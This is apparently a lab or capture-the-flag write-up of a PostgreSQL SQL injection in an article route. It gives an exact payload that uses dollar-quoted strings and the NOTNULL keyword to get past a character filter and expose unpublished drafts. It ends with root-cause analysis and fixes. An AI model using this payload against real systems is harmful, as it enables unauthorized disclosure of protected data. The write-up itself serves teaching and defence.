# Gazette PostgreSQL Dollar-Quote SQL Injection

## What Is Happening

The Gazette lab exposes article pages at:

```text
/article/<id>
```

The `<id>` value is evaluated as part of a PostgreSQL expression. Arithmetic payloads prove that the value is not parsed as a plain integer before reaching SQL:

```text
/article/2-id -> article 1
/article/4-id -> article 2
/article/6-id -> article 3
```

Direct unpublished IDs are still blocked:

```text
/article/6 -> 404
```

That means the application likely applies the publish filter before the injectable ID comparison:

```sql
WHERE published = true AND id = <payload>
```

## Why It Happens

The route appears to interpolate the path segment into SQL. The validator blocks common injection separators such as spaces and many symbols, but it still allows letters, digits, `$`, and `-`.

PostgreSQL dollar-quoted strings can create SQL token boundaries without single quotes or spaces:

```text
$a$0$a$
```

The keyword form `NOTNULL` can also avoid the need for a space-separated `IS NOT NULL`.

## Exact Test

Request:

```text
/article/%24a%240%24a%24OR-0-%24b%240%24b%24NOTNULL--
```

Decoded:

```text
$a$0$a$OR-0-$b$0$b$NOTNULL--
```

Likely SQL interpretation:

```sql
published = true AND id = $a$0$a$ OR -0 - $b$0$b$ NOTNULL--
```

Equivalent condition:

```sql
(published = true AND id = '0') OR ((-0 - '0') IS NOT NULL)
```

## Expected Signal

- The response should include normal published articles.
- The response should also include an unpublished draft.
- Direct access to the draft article ID should still fail.

## Result Interpretation

The payload bypassed the publish filter and rendered the unpublished draft:

```text
DRAFT - incident retro: pricing engine cutover
```

The draft body contained the lab flag / migration token. The exact value is intentionally not stored in this writeup.

## Root Cause

The application trusts a path parameter as SQL syntax. The allowlist blocks common payloads, but it does not enforce the intended type: a decimal article ID.

The confirmed security issue is SQL injection leading to a server-side authorization filter bypass.

## Impact

An unauthenticated attacker can disclose unpublished internal articles. In this lab, that exposes a migration token / flag stored in draft article content.

## Fix

- Convert the path parameter to an integer before querying.
- Use parameterized SQL:

```sql
SELECT ...
FROM articles
WHERE published = true AND id = $1
```

- Reject any non-decimal ID at the router/controller boundary.
- Avoid returning raw PostgreSQL errors to users.
- Add regression tests proving draft IDs and SQL expressions do not return unpublished content.

## Key Lesson

Input filters that remove spaces and common punctuation do not make SQL interpolation safe. PostgreSQL-specific syntax, including dollar-quoted strings and keyword variants like `NOTNULL`, can restore token boundaries under tight character constraints.
